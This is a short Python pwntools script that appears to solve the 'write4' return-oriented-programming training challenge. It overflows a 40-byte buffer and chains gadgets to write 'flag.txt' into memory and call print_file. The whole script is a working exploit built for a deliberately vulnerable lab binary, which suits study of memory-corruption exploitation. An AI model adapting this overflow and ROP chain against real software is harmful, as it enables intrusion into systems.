import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./write4')
io = elf.process()
pwn.gdb.attach(io)
time.sleep(3)
#Overflow the function
offset = 40
retAddr = 0x4004e6
#Move "flag.txt" into memory
popTextGadget = 0x400690 #pop r14; pop r15; ret
text = b'flag.txt'
emptyMemAddr = 0x601030
movAddr = 0x400628#mov qword ptr [r14], r15
#Set rdi as the memory location
popRDIGadget = 0x400693
#Call the printf function
printAddr = elf.plt['print_file']
payload = b"".join(
    [
        b'A'*offset,
        pwn.p64(retAddr),
        pwn.p64(popTextGadget),
        pwn.p64(emptyMemAddr),
        text,
        pwn.p64(movAddr),
        pwn.p64(popRDIGadget),
        pwn.p64(emptyMemAddr),
        pwn.p64(printAddr)
    ]
)
io.recv(1000)
io.sendline(payload)
io.interactive()
